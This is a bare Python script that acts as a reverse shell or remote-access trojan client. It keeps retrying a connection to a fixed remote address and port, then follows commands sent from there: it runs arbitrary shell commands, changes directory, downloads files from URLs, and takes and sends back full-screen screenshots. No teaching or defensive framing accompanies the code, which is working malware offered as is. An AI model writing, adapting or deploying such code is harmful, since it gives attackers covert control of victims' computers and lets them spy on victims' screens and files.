import socket
import json
import subprocess
import os
import time
import requests
from mss import mss
import base64

# 1. CREATE
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 2. CONNECT
while True:
	try:
		sock.connect(('1.1.1.1', 54321))
		break
	except:
		time.sleep(60)

# 3. SEND AND RECEIVE
while True:
	command = json.loads(sock.recv(1024))

	if command == 'quit':
		break

	if len(command.split()) == 2 and command.split()[0] == 'cd':
		route = command.split()[1]
		os.chdir(route)
	elif len(command.split()) == 2 and command.split()[0] == 'download':
		try:
			url = command.split()[1]
			response = requests.get(url)

			filename = url.split('/')[-1]
			with open(filename, 'wb') as file:
				file.write(response.content)

			message = 'File downloaded successfully'
			sock.send(json.dumps(message).encode())
		except:
			message = 'There was an error when trying to download the file'
			sock.send(json.dumps(message).encode())
	elif len(command.split()) == 1 and command.split()[0] == 'screenshot':
		try:
			filename = 'fullscreen.png'

			with mss() as sct:
				sct.shot(mon=-1, output=filename)

			with open(filename, 'rb') as file:
				content = base64.b64encode(file.read())
				sock.send(json.dumps(content.decode()).encode())

			os.remove(filename)
		except:
			continue
	else:
		response = subprocess.run(command, capture_output=True, shell=True)
		sock.send(json.dumps(response.stdout.decode()).encode())

# 4. CLOSE CONNECTION
sock.close()
